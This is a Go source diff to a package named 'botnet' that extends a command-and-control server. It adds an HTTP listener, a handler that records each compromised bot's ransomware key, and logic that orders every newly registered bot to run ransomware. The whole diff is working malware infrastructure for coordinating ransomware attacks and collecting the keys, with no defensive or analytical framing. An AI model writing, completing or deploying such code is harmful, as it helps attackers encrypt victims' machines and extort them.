@@ -2,27 +2,46 @@ package botnet
 
 import (
 	"bytes"
+	"encoding/gob"
 	"fmt"
 	"io"
 	"log"
 	"net"
-	"os"
+	"net/http"
 )
 
 // CC is the command and control center.
 type CC struct {
 	Port    string
 	Host    string
+	APIPort string
 	Storage Storage
 }
 
 //NewCC is
 func NewCC(host, port string, s Storage) *CC {
-	return &CC{
+	cc := &CC{
 		Host:    host,
 		Port:    port,
+		APIPort: "8000",
 		Storage: s,
 	}
+
+	if err := s.CreateBuckets(); err != nil {
+		log.Panic(err)
+	}
+	return cc
+}
+
+//ListenAPI is
+func (c *CC) ListenAPI() {
+	addr := fmt.Sprintf("%s:%s", c.Host, c.APIPort)
+
+	http.HandleFunc("/hey", func(w http.ResponseWriter, r *http.Request) {
+		w.Write([]byte("sup"))
+	})
+	Msg("http listening on", addr)
+	http.ListenAndServe(addr, nil)
 }
 
 //Listen is
@@ -31,9 +50,8 @@ func (c *CC) Listen() {
 	listener, err := net.Listen("tcp", addr)
 	if err != nil {
 		Err(err, "listening on addr", addr)
-		os.Exit(1)
+		return
 	}
-
 	Msg("listening on", addr)
 
 	c.acceptConnections(listener)
@@ -46,15 +64,15 @@ func (c *CC) acceptConnections(l net.Listener) {
 			Err(err, "accepting connection")
 			continue
 		}
-
 		go c.handleConnection(conn)
 	}
 }
 
 func (c *CC) handleConnection(conn net.Conn) {
-	var req bytes.Buffer
-	if _, err := io.Copy(&req, conn); err != nil {
-		log.Panic(err)
+	req := new(bytes.Buffer)
+	if _, err := io.Copy(req, conn); err != nil {
+		Err(err)
+		return
 	}
 
 	command := bytesToCommand(req.Bytes()[:commandLength])
@@ -62,6 +80,21 @@ func (c *CC) handleConnection(conn net.Conn) {
 	switch command {
 	case "genesis":
 		c.handleGensis(req.Bytes()[commandLength:])
+	case "rancom":
+		c.handleRansomwareComplete(req.Bytes()[commandLength:])
+	}
+
+	conn.Close()
+}
+
+func (c *CC) handleRansomwareComplete(payload []byte) {
+	req := new(RansomCompleteRequest)
+	if err := gob.NewDecoder(bytes.NewReader(payload)).Decode(req); err != nil {
+		log.Panic(err)
+	}
+
+	if err := c.Storage.AddRansomKey(req.BotID, req.Key); err != nil {
+		log.Fatal(err)
 	}
 }
 
@@ -74,9 +107,22 @@ func (c *CC) handleGensis(payload []byte) {
 	if _, err := c.Storage.AddBot(bot); err != nil {
 		log.Panic(err)
 	}
+	Msg("bot was added")
+
+	data := append(commandToBytes("ransomware"), []byte{}...)
+	sendData(bot.Addr(), data)
 }
 
-//AddBot is
-func (c *CC) AddBot(b *Bot) error {
-	return nil
+func sendData(addr string, data []byte) {
+	conn, err := net.Dial("tcp", addr)
+	if err != nil {
+		fmt.Printf("%s is not available\n", addr)
+		return
+	}
+	defer conn.Close()
+
+	_, err = io.Copy(conn, bytes.NewReader(data))
+	if err != nil {
+		log.Panic(err)
+	}
 }
